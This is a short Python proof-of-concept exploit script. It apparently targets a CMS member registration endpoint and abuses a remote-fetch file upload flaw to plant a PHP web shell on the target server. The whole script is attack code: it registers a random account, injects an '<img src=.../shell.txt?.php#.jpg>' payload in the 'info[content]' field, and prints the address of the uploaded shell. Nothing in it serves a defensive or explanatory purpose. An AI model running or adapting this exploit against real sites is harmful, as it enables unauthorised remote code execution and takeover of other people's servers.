# coding: utf-8
import re
import requests
import sys
import random
import string

def poc(url):
    ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 16))
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '1',
        'username': 'test'+ran_str,
        'password': 'testxxxxx',
        'email': 'test' + ran_str + '@test.com',
        'info[content]': '<img src=' + url + '/shell.txt?.php#.jpg>', 
        'dosubmit': '1',
    }
    rep = requests.post(u, data=data)

    shell = ''
    re_result = re.findall(r'&lt;img src=(.*)&gt', rep.content)
    #print rep.content
    if len(re_result):
        shell = re_result[0]
        print '上传文件地址:',shell

if __name__ == '__main__':
    poc(sys.argv[1])  # 目标站点根目录
